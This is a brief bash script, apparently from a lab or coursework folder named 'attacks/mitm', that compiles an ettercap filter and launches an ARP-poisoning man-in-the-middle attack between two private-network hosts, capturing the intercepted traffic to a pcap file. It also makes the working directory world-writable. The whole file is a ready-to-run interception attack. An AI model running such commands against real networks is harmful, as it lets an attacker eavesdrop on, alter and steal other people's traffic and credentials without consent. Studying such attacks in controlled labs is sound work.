#!/bin/bash

#cd src
cd attacks/mitm
chmod 777 .

etterfilter mitm.ecf -o mitm.ef 
ettercap -Tqi eth0 -F mitm.ef -w ettercap-packets.pcap -M arp /192.168.0.11// /192.168.0.22// 
#ettercap -Tqi eth0 -w ettercap-packets.pcap -F mitm.ef -M arp /192.168.0.11// /192.168.0.22// 

